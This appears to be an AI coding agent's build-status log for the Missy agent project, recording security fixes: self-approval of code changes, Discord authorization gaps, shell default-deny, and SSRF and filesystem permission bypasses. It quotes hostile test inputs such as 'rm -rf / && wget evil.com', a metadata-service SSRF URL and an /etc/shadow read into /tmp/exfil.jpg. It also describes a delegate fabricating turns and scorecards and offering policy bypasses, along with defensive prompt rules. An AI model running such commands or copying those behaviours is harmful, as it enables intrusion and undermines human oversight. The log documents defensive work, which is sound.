# Build Status

Last updated: 2026-07-10 15:15 UTC

## Current Workstream: Validation-Harness Overhaul

Driven by `~/missy-loops/prompt.md`. Branch:
`overhaul/missy-validation-20260710-031406`. Draft PR:
https://github.com/MissyLabs/missy/pull/31

### Baseline (preserve — do not overwrite)

Source: `~/fixes.md`, derived from
`missy-validation-harness/HARNESS_RUN_SUMMARY_TOOL_SPECIFIC.md` (90 result
records, 2026-07-09/10 run). **43 of 89 cases** scored below the 38/50
threshold or otherwise failed, overwhelmingly because Missy identified
itself as Claude Code, claimed Missy's tools were unavailable, or used a
delegate-native capability outside Missy's tool path.

Root-cause groups (see `~/missy-loops/prompt.md` for full text):

- **FX-A** (dominant, ~30 failures): acpx delegate had native tool access
  instead of being forced through Missy's structured tool-call protocol.
- **FX-B**: Discord conversation turns not persisted to
  `SQLiteMemoryStore` (only 3 rows existed despite 937
  `agent.run.start` events).
- **FX-C**: factual state claims (memory IDs, Incus state) not grounded
  in fresh tool evidence.
- **FX-D**: delegate fabricated future conversation turns and a
  self-authored scorecard (`DISC-CMD-006`).
- **FX-E**: delegate offered a policy-bypass write path when
  `self_create_tool` appeared unavailable.
- **FX-F**: browser validation environment (`unshare(CLONE_NEWPID):
  EPERM`) distinct from the acpx routing bug.
- **FX-G**: a combined Incus lifecycle request exceeded acpx's 300s
  subprocess timeout.

Full 89-case backlog (FS/SH/WB/X11/AT/VIS/AUD/DU/MEM/SELF/INCUS/XT/
SEC-PI/SEC-SCOPE/DISC-CMD) and SR-1.1 through SR-4.8 security-review
remediation items are tracked verbatim in `~/missy-loops/prompt.md`; not
reproduced here to avoid drift between two copies.

### Completed This Session (2026-07-10)

1. **Voice command parsing fix preserved + hardened.** The pre-existing
   `voice_fix` commit (trailing full-stop / conversational-clause
   handling in `missy/channels/discord/voice_commands.py`) was already
   on `master`. Added 9 regression tests directly against
   `parse_voice_intent()` covering trailing punctuation, trailing
   clauses, and combined status/say/leave phrasing. This surfaced a real
   bug: a trailing comma attached directly to a channel name (no
   preceding whitespace, e.g. `"...channel, then say hi"`) leaked into
   the parsed channel name because `_TRAILING_CLAUSE_RE` required `\s+`
   before its comma alternative and `.strip(" .")` didn't strip commas.
   Fixed by splitting the comma branch out of the connector-word
   alternation (zero-width leading whitespace) and stripping commas at
   both ends of the target. All 37 voice-command tests pass.

2. **FX-A: acpx zero-native-tools + fail-closed enforcement**
   (`missy/providers/acpx_provider.py`). This is the first concrete
   slice of the dominant root cause. Verified against the actual pinned
   `acpx@0.3.1` source
   (`~/.nvm/.../lib/node_modules/acpx/dist/{cli,session-*}.js`), not
   just documentation:
   - `parseAllowedTools("")` returns `[]` (explicit empty array), which
     the claude agent adapter maps to
     `claudeCodeOptions.allowedTools = []` — the Claude Code SDK's
     documented behavior for an explicit empty allowlist is that no
     native tool is callable.
   - Every acpx invocation (`complete`, `complete_with_tools`, `stream`)
     now unconditionally appends `--allowed-tools ""` and
     `--non-interactive-permissions deny` as the last flags before the
     agent/exec argument, so they cannot be shadowed by
     operator-configured `base_url` extra flags even before
     sanitization.
   - `_sanitize_extra_flags()` strips `--allowed-tools`, `--approve-all`,
     `--approve-reads`, `--deny-all`, `--non-interactive-permissions`,
     and `--cwd` (plus their value tokens) from any `base_url`-supplied
     flags, logging a warning. Verified end-to-end with a real
     `base_url="--approve-all --cwd /evil --verbose"` config: only
     `--verbose` reaches the subprocess argv, and the forced security
     flags land after it.
   - `is_available()` now also runs `acpx --help` and requires both
     `--allowed-tools` and `--non-interactive-permissions` to appear in
     the output before reporting the provider available — a real,
     deterministic fail-closed health check (not just binary presence).
     Verified working against the actual installed `acpx@0.3.1` binary.
   - `_isolated_cwd()`: acpx subprocesses now default to
     `~/.missy/acpx_sandbox` (mode 0700, created once, nothing ever
     written into it) instead of acpx's own default of
     `process.cwd()`, which — run from inside Missy — would otherwise be
     Missy's actual repository (real git history, source, `CLAUDE.md`).
     `--cwd` is one of the sanitized/hardcoded flags so config cannot
     redirect it back into a real repository. An explicit `cwd` kwarg
     from trusted internal callers is still honored.
   - `_render_delegation_envelope()`: `complete_with_tools()` no longer
     relies on a bare `[System]:` text prefix as the only control
     boundary. It now injects a versioned
     (`[missy-acpx-envelope/1]`) block stating the delegate is Missy's
     planning component (not an independent agent), has no native
     tools, must respond only to the current request, and must never
     fabricate `[User]:`/`[Assistant]:` turns or a self-authored
     scorecard. Covers part of FX-D as well since it's the same code
     path.
   - `_strip_leaked_transcript_markers()`: defensive post-parse scrub
     that truncates delegate output at the first leaked
     `[User]:`/`[Assistant]:`/`[System]:` marker, applied in both
     `complete()` and `complete_with_tools()` before tool-call parsing
     (so a tool call appearing only after a fabricated turn cannot be
     extracted and executed). Emits a `provider_invoke`/`deny` audit
     event when triggered. Regression test reproduces the exact
     `DISC-CMD-006` shape (`"42 + 8 = 50\n[User]: ...\n[Assistant]: 25/25
     PASS"`) and confirms only the real answer survives.
   - Tool-call execution already routed through
     `AgentRuntime._tool_loop()` → `registry.execute()` (confirmed by
     reading `missy/agent/runtime.py`); no change needed there.
   - Not yet done (remaining FX-A work, tracked): bullet 6's
     representative end-to-end proof across filesystem, shell, browser,
     X11, AT-SPI, vision, audio, Discord upload, memory,
     `self_create_tool`, and `code_evolve` categories — this is the
     89-case validation backlog (below) and the FX-A rerun list
     (`AUD-001..005`, `VIS-001..005`, `WB-002..007`, `X11-001..005`,
     `AT-001..004`, `XT-001,2,4,5,6`, `DU-001,002`, `DISC-CMD-002`,
     `SELF-002`, `SELF-004`).

### Completed This Session, continued: FX-B (Discord memory persistence)

Root cause found and fixed. `AgentRuntime._make_memory_store()`
(`missy/agent/runtime.py`) was constructing
`missy.memory.store.MemoryStore` — a JSON file at `~/.missy/memory.json`
— while every real consumer of `self._memory_store` already assumed the
SQLite backend at `~/.missy/memory.db`:

- `_intercept_large_content()` imports `LargeContentRecord` from
  `missy.memory.sqlite_store` and calls `.store_large_content()`, which
  the JSON store doesn't implement at all (silently caught, falling back
  to a truncated preview — this is also SR-3.3).
- `compact_if_needed()` (`missy/agent/compaction.py`) is type-hinted to
  require `SQLiteMemoryStore` specifically and calls
  `get_uncompacted_summaries`/`add_summary`/etc., none of which the JSON
  store has (also SR-3.2).
- `memory_search`/`memory_describe`/`memory_expand` tools, `missy
  sessions`, hatching's welcome-turn seeding, and this validation
  harness all read `~/.missy/memory.db` directly.
- `_save_turn()` called `add_turn(session_id=..., role=..., ...)` with
  keyword arguments — the JSON store's signature. The real
  `SQLiteMemoryStore.add_turn()` takes one `ConversationTurn` object
  positionally; calling it with those kwargs would have raised
  `TypeError` on every write had the store actually been swapped without
  also fixing this call site.

Fixed:
- `_make_memory_store()` now returns `SQLiteMemoryStore()`
  (`~/.missy/memory.db`), matching every other production consumer and
  `CLAUDE.md`'s documented "Memory DB" path.
- `_save_turn()` now constructs a `ConversationTurn` object and calls
  `add_turn(turn)`. On failure it now logs at `warning` (was `debug`,
  i.e. invisible by default) and emits a new `memory.persist_failed`
  audit event — FX-B: "never let persistence failure disappear
  silently."
- The user turn is now persisted immediately after loading history and
  *before* the (possibly failing/timing-out) provider call, not only
  after a successful completion. Previously a crashing delegate meant
  neither the user's message nor any response was ever recorded — the
  incoming request itself disappeared. History is loaded first so the
  just-saved turn can't leak into its own prompt context.
- **Same bug, second instance found and fixed**:
  `VisionMemoryBridge.store_observation()`
  (`missy/vision/vision_memory.py`) had the identical kwargs-vs-object
  mismatch calling `self._memory.add_turn(session_id=..., ..., metadata=...)`
  against a real `SQLiteMemoryStore` — meaning vision observations were
  never actually persisted either (every call raised `TypeError`,
  silently caught). Fixed to construct a `ConversationTurn` via
  `.new()`, set `.metadata`, and call `add_turn(turn)`. This likely
  affects `VIS-004` (scene memory) in the validation backlog.
- Added `tests/integration/test_discord_memory_persistence.py`: drives
  `AgentRuntime.run()` the same way Discord's channel handler does
  (`missy/cli/main.py`'s `_process_channel` → `_discord_agent.run`),
  against a real on-disk `SQLiteMemoryStore` (no memory-layer mocking).
  Covers basic persistence, `get_recent_turns`/`get_session_turns`/
  `search` retrieval, session restart/resume across a fresh runtime
  instance pointed at the same db file, concurrent multi-channel
  isolation, a failing provider (user turn still recorded, audit event
  emitted), and session-id derivation correctness.
- Updated ~30 existing test assertions across `tests/vision/test_vision_memory*.py`,
  `test_context_memory_edges.py`, `test_intent_multicamera_hardening.py`,
  `test_new_modules_security.py`, `test_shutdown_frame_coverage.py`,
  `test_vision_modules_edges.py`, `test_vision_security_edges.py`, and
  `tests/agent/test_coverage_gaps.py` that were asserting against the old
  (incorrect) kwargs-call convention using bare `MagicMock()`s — which is
  exactly why this bug shipped undetected: the mocks accepted any call
  shape, so the tests never caught the real-store signature mismatch.

Not yet done: `run_stream()` (CLI-only streaming path, not used by
Discord) still saves both turns after completion rather than the user
turn first — left as-is to keep this change scoped, tracked as
follow-up. Redaction/privacy-scope requirements beyond faithful
session-id isolation (e.g. secret scrubbing before persistence) are not
yet covered — overlaps SR-1.10 and is deferred to that work.

Rerun per prompt.md: `MEM-001`, `MEM-004`, `SEC-PI-004`, `XT-006` still
need live/harness re-validation against real seeded content (not yet
attempted this session — requires either a live acpx delegate run or a
scripted harness replay).

### Completed This Session, continued: FX-E + SR-1.2/1.3 (critical: unauthenticated code-evolution self-approval)

While investigating FX-E ("never offer approval/policy bypasses when a
gated tool is unavailable"), found a **critical, live, actively-exploitable
vulnerability**, not just the narrower FX-E symptom: Missy's own default
system prompt instructed the agent to approve and apply its own code
changes, and nothing in the code path stopped it.

**Root cause 1 — the agent-facing tool had no gate at all.**
`missy/tools/builtin/code_evolve.py`'s `CodeEvolveTool` exposed
`approve`, `apply`, and `rollback` actions directly to the model's
tool-calling loop. `CodeEvolutionManager.approve()`/`apply()`/
`rollback()` (`missy/agent/code_evolution.py`) perform **no
authentication of any kind** — they trust every caller unconditionally.
Worse, the default `AgentConfig.system_prompt`
(`missy/agent/runtime.py`) literally instructed the model: *"2)
code_evolve(action='propose', ...) 3) code_evolve(action='approve',
...) 4) code_evolve(action='apply', ...) — runs tests, commits,
restarts."* — actively teaching the exact behavior SR-1.2 prohibits: *"A
model ... must never approve its own code change."* Since `code_evolve`
is in the Discord-allowed tool group, this was reachable from ordinary
conversation.

**Root cause 2 — a second, independent path with the same flaw.**
`missy/channels/discord/channel.py`'s `_handle_reaction()` implements a
✅/❌ emoji-reaction workflow on evolution-proposal messages. It called
`CodeEvolutionManager().approve(proposal_id)` directly for **any**
Discord user who reacted with ✅ — no admin/owner allowlist check
existed at all (SR-1.2 explicitly names "Discord user" as an entity
that must never approve its own — or anyone's — code change). This is a
separate, independently-discovered instance of the identical trust
failure via a different ingress.

**Fix (interim, matching the actual local-first single-operator trust
boundary this codebase already relies on elsewhere):**
- `CodeEvolveTool` no longer exposes `approve`/`apply`/`rollback` to
  the model at all — those actions are refused unconditionally, before
  `CodeEvolutionManager` is even constructed, with a clear message
  pointing to the real path (`missy evolve approve/apply/rollback <id>`
  from a terminal on the host). `propose`, `propose_multi`, `list`,
  `show`, `reject` remain available (none of them mutate source or
  restart the process). Removed the now-dead `_approve`/`_apply`/
  `_rollback` handler methods.
- Rewrote the default system prompt's self-evolution instructions:
  propose, then stop and tell the user/operator the proposal needs
  human review — explicit "never offer a bypass" instruction added.
- Added a general FX-E safety instruction to the default system prompt:
  when any gated tool is unavailable/denied, report the limitation and
  stop; never suggest raw file writes, shell commands, alternate
  providers, or manual storage edits as a substitute.
- `_handle_reaction()`'s ✅ branch no longer calls `mgr.approve()`. It
  replies that Discord cannot approve evolutions and directs the user to
  the CLI, and emits a `discord.evolution.approve_denied` (`deny`)
  audit event instead of `discord.evolution.approved` (`allow`). ❌
  (reject) is unchanged — safe, since it only narrows scope.
- The legitimate human-operator path (`missy evolve approve/apply/
  rollback` in `missy/cli/main.py`, calling `CodeEvolutionManager`
  directly) is untouched — it already requires an interactive shell
  session on the host, the same trust boundary every other local-first
  Missy control surface relies on. No Web API evolve-approval route
  exists yet; CLAUDE.md's Web TUI docs should be checked for accuracy
  here in a future session.
- Updated ~15 existing tests across `tests/tools/test_code_evolve.py`,
  `tests/tools/test_code_evolve_gap_coverage.py`,
  `tests/security/test_self_create_tool_script_validation.py`, and
  `tests/channels/test_discord_evolution_reactions.py` that exercised
  the now-removed tool-level approve/apply/rollback behavior. Added new
  tests asserting the refusal (including that `CodeEvolutionManager` is
  never constructed for those actions from the tool, and that Discord
  approve reactions emit a deny audit event without ever calling
  `mgr.approve()`).

**Not a complete SR-1.2/1.3 fix.** This closes the two live bypass
paths but does not yet implement the full ask: "unforgeable,
proposal-bound, expiring approval artifact," disposable-sandbox
validation before promotion, or an authenticated Web API approval
route. `CodeEvolutionManager.approve()`/`apply()`/`rollback()`
themselves still perform zero authentication — the CLI's own terminal
session is the only thing standing between "authenticated" and "not."
Tracked as remaining SR-1.2/1.3 work.

Rerun per prompt.md: `SELF-002` (rerun after FX-A too, per the FX-A
rerun list) should be re-validated against this fix.

### Completed This Session, continued: FX-D (current-turn structural boundary + fail-closed leaked-marker handling)

`missy/providers/acpx_provider.py::_build_prompt()` now inserts an
explicit, literal boundary line
(`[missy-acpx-envelope/1] === CURRENT REQUEST (respond only to what
follows) ===`) immediately before the final (current-turn) message in
every flattened multi-message prompt. Previously the envelope only
*described* this rule in prose ("respond only to the current request");
there was no structural marker in the prompt itself distinguishing
"here is what happened before" from "here is what you must respond to
now" — which is exactly what let the delegate treat the whole flattened
transcript as an invitation to keep writing (the DISC-CMD-006 failure).
The same constant is referenced by both `_build_prompt()` (which inserts
it) and the envelope preamble (which explains it), so they cannot drift
apart. Verified the marker tracks whatever message is actually last
across growing tool-loop rounds, long history (100+ prior turns), and
that it does not interfere with legitimate user text that happens to
quote a prior `[Assistant]:` snippet (the leaked-marker defense only
ever runs on the *delegate's output*, never on constructed prompt input).

Also hardened both `complete()` and `complete_with_tools()` to **fail
closed** (raise `ProviderError`) when stripping a leaked transcript
marker leaves nothing legitimate behind — previously an entirely
fabricated response would silently become an empty
`CompletionResponse(content="", finish_reason="stop")`, which could look
like a valid terse answer to the runtime rather than the anomaly it is.
A partial leak (real content survives after stripping) still returns
normally.

Added ~20 new tests in `tests/providers/test_acpx_provider.py` covering:
boundary placement and tracking across rounds, quoted transcript text in
legitimate user input, multiline and long-history requests, malicious
history instructions (structurally confined before the boundary,
verified positionally), full DISC-CMD-006 and a second
report-then-fake-followup scenario with both defenses active together,
and the new fail-closed behavior (plus a control test confirming partial
leaks do *not* fail closed).

Not addressed this session (out of scope for a code fix): FX-D bullet 3
("never accept a model's self-authored scorecard... as validation
evidence") is a validation-methodology principle for how the harness
itself should score runs, not something enforceable in the provider
code path — reflected in how this session's own test assertions verify
actual behavior rather than trusting embedded pass/fail text.

Rerun per prompt.md: both `DISC-CMD-006` continuity and report-followup
scenarios have unit-level reproductions now passing; live harness
re-validation against a real delegate is still open (see FX-A residual
work).

### Completed This Session, continued: SR-1.13 (Discord ingress authorization — two critical findings)

Continuing the security-finding sweep, found and fixed a third and
fourth independent instance of "unauthenticated action reachable before
the authorization gate" this session:

1. **`_handle_message()` voice/image/screencast reordering.** The
   handler dispatched voice-join, `!analyze`/`!screenshot`, and
   `!screen ...` commands **before** `_check_dm_policy()`/
   `_check_guild_policy()` ran — the code literally had a comment
   reading "handled before policy gates." Any guild message (ignoring
   `allowed_channels`/`allowed_users`/`require_mention`) or DM (ignoring
   `dm_policy`) could trigger real side effects: joining a voice
   channel, capturing/analyzing a screenshot, starting a screen share.
   Fixed by reordering: bot-author filter and DM/guild authorization now
   run before all three special-command dispatchers. Credential
   scrubbing intentionally still runs first (before authorization) so
   secrets get scrubbed everywhere regardless of policy — strictly more
   protective, not a regression.

2. **`_handle_interaction()` (slash commands) had *no* authorization
   check at all — more severe than finding 1.** `/ask`, `/status`,
   `/model`, `/help` arrive over a completely separate Gateway event
   (`INTERACTION_CREATE`) with its own handler, which never called
   `_check_dm_policy()`/`_check_guild_policy()` at all. Any Discord user,
   in any guild/channel/DM, could invoke `/ask` and get a full agent
   response regardless of every configured policy. **Compounding bug in
   the same code path:** `_handle_ask()`
   (`missy/channels/discord/commands.py`) hardcoded
   `session_id="discord"` for every user, so every `/ask` interaction
   across the whole bot shared one conversation history — cross-user
   context bleeding, independent of the authorization gap. Fixed both:
   `_handle_interaction()` now extracts the invoking user
   (`member.user.id` for guilds, `user.id` for DMs) and runs the same
   authorization gate (with a new `skip_mention_check` option on
   `_check_guild_policy()`, since `require_mention` is a text-message
   rule that doesn't apply to slash commands); `_handle_ask()` now
   scopes `session_id` per invoking user, matching the convention
   already used by the regular message path.

Added 11 tests for finding 1
(`tests/channels/test_discord_channel_gap_coverage.py::TestUniformIngressAuthorizationSR113`)
and 14 tests for finding 2 (6 in
`tests/channels/test_discord_channel_coverage.py::TestHandleInteractionAuthorizationSR113`,
8 in `tests/unit/test_discord_commands_coverage.py` covering author-ID
extraction and per-user session isolation).

**New finding, not yet fixed, tracked as task #15:**
`DiscordGuildPolicy.allowed_roles` is documented and parsed from config
but never actually enforced anywhere in `_check_guild_policy()` — an
operator who configures it gets no role-based restriction at all.
Fixing it needs role-ID-to-name resolution from the message/interaction
payload, a larger change deferred to a follow-up session.

Full detail and residual risk for all four SR-1.x findings this session
(SR-1.2/1.3, SR-1.12, SR-1.13 ×2) is in `AUDIT_SECURITY.md`.

### Completed This Session, continued: FX-C (grounding factual state claims)

Audited the memory-ID lookup and Incus structured-output paths named in
FX-C against the actual current code (post-FX-B fix):

- **Memory ID lookups already route through the real SQLite backend**
  (thanks to the FX-B fix earlier this session) and already distinguish
  a genuinely missing ID from a tool-unavailable state via explicit
  `_err(...)` returns. What was missing: `memory_describe`/
  `memory_expand` didn't distinguish a **lookup exception** (DB locked,
  I/O error) from a **genuine "not found."** Both previously surfaced
  through the same code path, but an exception's text wasn't
  differentiated from the "not found" claim, risking exactly the harness
  observation ("false claims that known sum_*/ref_* IDs did not exist").
  Fixed: all four lookup call sites in `missy/tools/builtin/memory_tools.py`
  now catch exceptions separately and return an explicit
  "lookup failed... does not mean the ID does not exist... unverified"
  message, never conflated with the not-found case. 8 new tests in
  `tests/tools/test_memory_tools.py` (using a store stub that always
  raises) confirm the two error shapes are textually distinguishable,
  plus a grounding test confirming described content matches exactly
  what was stored.
- **Incus list/network tool output was already a deterministic JSON
  passthrough** — `_run_incus()` parses `--format json` output directly
  into the `ToolResult`, with no LLM-based resummarization at the tool
  layer. Added 10 regression tests in `tests/tools/test_incus_tools.py`
  proving exact row/field preservation for `incus_list` and
  `incus_network(action='list')` (including a test asserting no
  fabricated "lo" network appears when absent from real output, and
  that bridge address strings pass through unaltered) — this confirms
  the validation harness's observed "invented lo network and incorrect
  bridge address" was a **delegate/model behavior issue, not a tool-layer
  bug** (the tool already hands the model correct data).
- Since the fabrication happens at the model layer, the fix is a new
  explicit instruction (rule 6) in the acpx delegation envelope
  (`missy/providers/acpx_provider.py`): never add a row/field that
  "would typically be there," never invent a value, never claim
  existence/change/disappearance without a fresh in-task tool
  observation. New test confirms the rule renders in the actual prompt
  sent to the delegate.

Not addressed this session (larger, separate scope): FX-C's first bullet
("extend done-criteria and runtime verification to cover material
mid-task state claims") overlaps SR-4.4 (done-criteria verification is
currently a static prompt instruction, not wired to an actual
verification engine) — deferred as a larger workstream rather than
folded into this checkpoint.

Rerun per prompt.md: `MEM-002`, `MEM-003` now have direct unit coverage
for the exact failure modes described; `INCUS-006`, `INCUS-010` have
direct unit coverage proving the tool layer doesn't fabricate — live
harness re-validation of all four is still open (needs a real/scripted
delegate invocation, same blocker as FX-A bullet 6).

### Completed This Session, continued: FX-F bullet 1 (browser diagnostics classification)

Implemented `_classify_browser_error()` in
`missy/tools/builtin/browser_tools.py`, used by the shared `_err()`
helper every browser tool's `execute()` already routes exceptions
through. Distinguishes:
- Missing `playwright` package (passed through — `_start()` already
  raises a specific, actionable message).
- Browser binary not installed (`playwright install firefox` never
  run) — detected via Playwright's own "Executable doesn't exist"
  message, remediation added.
- Sandbox/kernel/namespace launch failure — detected via markers
  matching the harness's exact two observed failures
  (`unshare(CLONE_NEWPID): EPERM`, `Protocol error (Browser.enable)`)
  plus related namespace/seccomp/launch-failure text. Labeled
  explicitly as an environment limitation, not a Missy bug, a missing
  tool, or a policy denial — and the remediation text explicitly says
  **not** to disable sandboxing, add `SYS_ADMIN`, or use privileged
  containers (bullet 3), pointing instead at a disposable test
  environment (bullet 2, not yet built — see below).
- Everything else (navigation timeouts, DNS failures, selector not
  found) passes through unmodified — relabeling a real interaction
  error as a launch failure would itself be misleading.

Live-verified against this actual dev sandbox: `playwright` is not
installed here, and `_classify_browser_error()` correctly returns the
specific "playwright not installed" guidance rather than a generic
"browser unavailable" message — this dev environment has the exact
same limitation the validation harness observed.

Added 8 new tests in
`tests/tools/test_browser_tools_gaps.py::TestClassifyBrowserError`,
including one that verifies the sandbox-failure remediation text never
contains `--no-sandbox` and explicitly names `SYS_ADMIN`/privileged
containers as what *not* to do.

**Not done this session (tracked as task #16, real infrastructure
work deserving its own session):** FX-F bullets 2 and 4 — providing an
actual reproducible, disposable, threat-modeled browser-test
environment (container/Incus profile with kernel/seccomp/namespace
tuning) and rerunning `WB-002` through `WB-007` and `XT-001` against
it. This dev sandbox cannot launch a real browser at all (confirmed
live), so there's no environment available in which to build or test
that infrastructure this session.

### Completed This Session, continued: FX-G (bound and decompose long acpx work)

Two of three FX-G bullets are substantially addressed as a side effect
of FX-A: post-FX-A, the delegate can no longer chain an entire
multi-step infrastructure lifecycle inside one native-tool-using acpx
call (native tools are disabled). Each acpx invocation now only needs
to make one tool-call decision, and the runtime's existing tool loop
(`AgentRuntime._tool_loop()`) already decomposes multi-step tasks into
bounded, observable rounds with per-iteration checkpointing and
failure-strategy rotation. Bullet 1 ("decompose... do not rely on one
opaque delegate execution") is therefore largely already satisfied by
the FX-A architecture change, not something requiring additional code
this session.

Implemented for bullet 2 ("explicit timeout configuration... safe upper
bounds"):
- `AcpxProvider.__init__` now clamps the configured timeout to a hard
  ceiling (`_MAX_TIMEOUT_SECONDS = 600`), logging a warning when a
  configured value is clamped. A misconfigured excessive timeout could
  otherwise let a single delegate call hang indefinitely, blocking
  budget enforcement and channel responsiveness.
- The timeout `ProviderError` message now explicitly states the
  outcome is UNKNOWN (not confirmed failed or succeeded) and instructs
  the caller to perform a fresh read-only check before retrying and to
  make any retry idempotent — the core of bullet 3 ("mark pending
  effects unknown... make mutating retries idempotent").

**Attempted and reverted this session:** process-group cleanup on
timeout (`start_new_session=True` + `os.killpg` via a `Popen`-based
rewrite of `_run_acpx`/`stream()`), to ensure no descendant process
(the underlying claude/codex CLI) survives after Missy gives up on a
timed-out call — `subprocess.run()`'s built-in timeout handling only
kills the immediate PID. Live-tested and confirmed working, but it
required mocking `subprocess.Popen` instead of `subprocess.run`, which
broke ~136 existing tests that mock the latter; migrating all of them
safely is a larger, separate task. Reverted to keep this checkpoint's
diff scoped and the test suite fully green; tracked as task #17 for a
dedicated future session.

Not done this session: idempotent retry enforcement for INCUS mutating
actions specifically, and a live rerun of `INCUS-006`'s timeout/
partial-completion/retry/cleanup paths (blocked on the same live-delegate
gap as FX-A bullet 6).

### Completed This Session, continued: SR-1.8 (shell default-deny — fifth confirmed critical finding)

Continuing the SR-1.x sweep, found and fixed a fifth critical
authorization-bypass vulnerability this session, and the most starkly
confirmed one: `ShellPolicyEngine.check_command()`
(`missy/policy/shell.py`) had an explicit code comment stating "Empty
allowed_commands means allow-all (shell is unrestricted when enabled)"
— directly contradicting `ShellPolicy.allowed_commands`'s own docstring
("An empty list means no commands are allowed even when enabled is
True") and every piece of operator-facing documentation
(`docs/configuration.md`, `docs/security.md`, `docs/troubleshooting.md`),
all of which already correctly promised deny-all. A pre-existing test
(`tests/policy/test_shell.py::test_empty_allowlist_allows_compound`,
now fixed) literally asserted
`engine.check_command("rm -rf / && wget evil.com")` returned `True`
under `ShellPolicy(enabled=True, allowed_commands=[])` — the exact
default an operator reaches by simply setting `shell.enabled: true`
without also remembering to populate `allowed_commands`.

Fixed: `check_command()` now raises `PolicyViolationError` when
`allowed_commands` is empty, aligning the implementation with its own
already-correct documented contract (no doc changes were needed — only
the code was wrong). Fixed 4 pre-existing tests that had encoded the
vulnerable behavior as expected, added a new explicit
empty-allowlist-denies test alongside the existing
explicit-allowlist-permits test. Full suite green (20755 tests) with no
other hidden dependencies on the old behavior found anywhere in the
codebase.

This is the fifth independent, confirmed critical finding this session
from the same systematic audit pattern (unauthenticated/unrestricted
action reachable due to a fail-open default), after SR-1.2/1.3, SR-1.12,
and SR-1.13 (×2).

### Completed This Session, continued: SR-1.5 (Incus tools' declaration/dispatch mismatch)

Fixed the review's "architectural finding" pattern for `missy/tools/builtin/incus_tools.py`:
`ToolRegistry._check_permissions()` derived the checked shell command from
`kwargs.get("command", "shell")`, but 14 of 15 Incus tools have no
`command` kwarg at all (so the meaningless literal `"shell"` was checked
instead of the real `incus` binary every one of them invokes), and
`incus_exec` *does* have a `command` kwarg — except it names the command
run inside the sandboxed guest, not the host `incus` binary actually
executed. Live-reproduced the worst case end-to-end against the real
registry+policy+subprocess stack: with `allowed_commands=["bash"]`
(an operator's plausible intent — "the agent may run bash scripts inside
sandboxed guests only") — `incus_exec(instance=..., command="bash")`
**passed policy** and the real host command
`["incus", "exec", "victim-container", "--", "bash", "-c", "bash"]`
executed, despite `incus` never being in the allowlist. Separately,
`incus_file` declared `shell=True` only, so its `host_path` kwarg
(arbitrary host read on push / write on pull) was never checked against
the filesystem policy at all.

Fixed generally, not just per-tool: added two optional hook methods to
`BaseTool` (`resolve_shell_command`, `resolve_filesystem_targets`) that
let a tool declare the real host command/paths it touches; the registry
now uses them when a tool overrides either (failing closed if a resolver
returns "no target" for a given call, rather than trusting an unrelated
kwarg), and falls back to the exact prior heuristic, byte-for-byte, for
every tool that doesn't override them — verified via the full suite
being green with zero changes needed anywhere except the migrated tools.
All 15 Incus tool classes now declare `resolve_shell_command() -> "incus"`;
`IncusFileTool` now declares filesystem permissions and resolves
`host_path` to the correct read/write direction from its `action` kwarg.
15 new tests across `tests/tools/test_registry_hardening.py` (generic
hook behavior) and `tests/tools/test_incus_tools.py` (Incus-specific,
including the live `incus_exec` host/guest-confusion reproduction and
`incus_file` path-enforcement cases).

Full detail, live-verification transcripts, and residual risk in
`AUDIT_SECURITY.md`'s new `### SR-1.5` section.

### Completed This Session, continued: SR-1.6 (Playwright browser navigation bypassed the network gateway — crown-jewel finding)

The review's most severe remaining finding: `BrowserNavigateTool` called
Playwright's `page.goto(url)` directly, with zero routing through
`PolicyHTTPClient` or the network policy engine — for a product whose
core claim is "no outbound traffic unless explicitly whitelisted." Two
compounding gaps: (1) the registry had no dynamic host-checking
mechanism for network permissions at all (unlike filesystem/shell, which
at least have a kwarg-name heuristic) — only a static, always-empty
`allowed_hosts` list; (2) even a top-level check wouldn't have covered
"every subresource/redirect/fetch inside Firefox," which the review
explicitly calls out as outside the Python gateway's reach.

Live-reproduced against the real registry+policy stack: with nothing
allowlisted, `browser_navigate(url="http://169.254.169.254/latest/meta-data/")`
— the AWS/GCP/Azure metadata-service SSRF target the review names
explicitly — passed the registry's permission check with zero denial,
proceeding straight to Playwright (failed only on this sandbox's
missing `playwright` package, an unrelated pre-existing limitation).

Fixed with two layers: (1) added a `resolve_network_hosts()` hook to
`BaseTool` (same pattern as SR-1.5's `resolve_shell_command`/
`resolve_filesystem_targets`), which `BrowserNavigateTool` overrides to
extract the target host from its `url` kwarg — the registry now checks
it via `engine.check_network()` before Playwright is ever touched,
confirmed to now deny the metadata-service URL above with a clean
`PolicyViolationError`. (2) Registered a Playwright
`context.route("**/*", ...)` handler on every browser session that gates
**every** request the browser makes — navigation, redirects,
subresources, and JS-triggered `fetch()`/XHR via `browser_evaluate` —
against the same policy engine, aborting (`route.abort("blockedbyclient")`)
on denial, an uninitialised policy engine, a disallowed scheme, or a
malformed URL; `data:`/`blob:`/`about:`/extension schemes are always
allowed through (required for normal rendering), and `file://` is always
blocked (arbitrary local filesystem access via the browser is a distinct,
unneeded capability). 18 new tests in `tests/tools/test_browser_tools_gaps.py`.

Full detail, live-verification transcripts, and residual risk (DNS
TOCTOU, WebRTC, `browser_evaluate` data exfiltration to already-allowed
hosts) in `AUDIT_SECURITY.md`'s new `### SR-1.6` section.

### Completed This Session, continued: SR-1.4 (vision_capture/vision_burst filesystem permission mismatch)

The same architectural pattern as SR-1.5, in the vision tools the review
names explicitly: `VisionCaptureTool` declared
`ToolPermissions(filesystem_read=True, filesystem_write=True)` but reads
its target from a `source` kwarg and writes to `save_path` (also reads
`device` for camera hardware paths) — none of which match the
registry's generic `path`/`file_path`/`target`/`destination` heuristic,
so the declared permissions enforced nothing. Live-reproduced: with
nothing filesystem-allowlisted, `vision_capture(source="/etc/shadow",
save_path="/tmp/exfil.jpg")` passed the registry's permission check
with zero denial and the tool actually called
`cv2.imread("/etc/shadow")` — it only failed because `/etc/shadow`
isn't a valid image format, not because of any policy gate.

Fixed by reusing SR-1.5's `resolve_filesystem_targets()` hook — no new
mechanism needed. `VisionCaptureTool` now resolves `source` as a read
target (unless it's a non-path sentinel like `"webcam"`), `device` as
an additional read target, and `save_path` as the write target
(falling back to the same fixed `~/.missy/captures/` default
`execute()` itself uses when omitted). `VisionBurstCaptureTool`
resolves `device` as a read target and only declares a write target
when `best_only=True`, matching that its non-best-only branch never
writes to disk at all. Live-verified the `/etc/shadow` reproduction is
now denied cleanly. 14 new tests in `tests/vision/test_vision_tools.py`.

Full detail and residual risk (no full sweep of every
`ToolPermissions(filesystem_*=True)`/`network=True` declaration across
`missy/tools/builtin/` has been performed — other not-yet-found
instances of this pattern may remain) in `AUDIT_SECURITY.md`'s new
